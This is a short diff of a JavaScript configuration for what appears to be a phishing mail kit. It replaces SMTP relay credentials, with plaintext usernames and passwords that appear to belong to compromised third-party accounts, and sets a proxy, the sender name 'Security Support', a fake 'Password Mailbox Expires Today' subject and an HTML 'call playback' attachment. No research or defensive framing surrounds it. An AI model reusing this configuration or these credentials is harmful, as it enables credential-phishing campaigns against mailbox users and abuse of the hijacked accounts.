@@ -102,12 +102,12 @@ const options = {
   useAuthentication: true,
   useProxy: false,
   proxyType: 'SOCKS5', // Options: 'SOCKS', 'HTTPS'
-  smtpHost: 'smtp.mandrillapp.com',
+  smtpHost: 'cpsrv15.misshosting.com',
   smtpPort: 587,
   smtpSecure: false,
   secureProtocol: 'SSLv23_method', // Options: 'SSLv23_method', 'TLSv1_2_method', etc.
-  smtpUsername: 'carnecrea@lit.com.uy',
-  smtpPassword: 'X2FHSuGbBPu71QnYna4yiQ',
+  smtpUsername: 'jimmy@jproj.se',
+  smtpPassword: 'Bonjovi2020',
   proxyHost: '63.160.189.222',
   proxyPort: 35149,
   proxyUsername: 'user',
@@ -122,7 +122,7 @@ const options = {
 
 
 const attachmentNameWithPlaceholders = 'call_playback_{RECIPIENT_DOMAIN_NAME}.html';
-const senderAddresses = ['carnecrea@fucrea.org'];
+const senderAddresses = ['jimmy@jproj.se'];
 const messageFile = 'message.html';
 const senderNameWithPlaceholders = "Security Support"; 
 const subjectLineWithPlaceholders = "Reminder: Password Mailbox Expires Today | REFID-{RANDOM_MD5}";
